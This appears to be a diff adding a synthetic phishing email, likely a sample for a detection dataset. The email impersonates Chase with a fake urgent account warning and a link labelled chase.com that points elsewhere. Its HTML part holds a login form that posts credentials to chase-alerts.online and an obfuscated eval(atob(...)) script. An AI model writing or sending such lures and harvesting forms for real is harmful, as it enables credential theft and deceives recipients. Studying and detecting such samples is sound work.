@@ -1,0 +1,35 @@
+From: notice@chase-alerts.online
+To: victim55@example.com
+Subject: Your parcel could not be delivered - click here
+Date: Tue, 16 Mar 2002 06:13:00 -0500
+Message-ID: <phish-175-79c0b298-246b-4edb-a57e-9b3cdcf685d9@chase-alerts.online>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 25 Mar 2002 00:52:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 03 Mar 2002 00:34:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 12 Mar 2002 14:17:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 05 Mar 2002 12:15:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 04 Mar 2002 16:49:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 20 Mar 2002 22:54:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 14 Mar 2002 17:46:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 23 Mar 2002 02:32:00 -0500
+Return-Path: <bounce@mail-b451c1eb.top>
+Reply-To: recovery5@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-b451c1eb.top; dkim=fail header.d=chase-alerts.online; dmarc=fail header.from=chase-alerts.online
+Received-SPF: fail (mx.example.com: domain of notice@chase-alerts.online does not designate 198.51.100.24 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=chase-alerts.online; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-175-6cec122c"
+
+--bnd-p-175-6cec122c
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://chase-alerts.online/login
+
+Reference: PEC2FFF
+--bnd-p-175-6cec122c
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://chase-alerts.online/login<br/><br/>Reference: PEC2FFF</p><p><a href="http://chase-alerts.online/login">https://www.chase.com/signin</a></p><form action="http://chase-alerts.online/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-175-6cec122c--
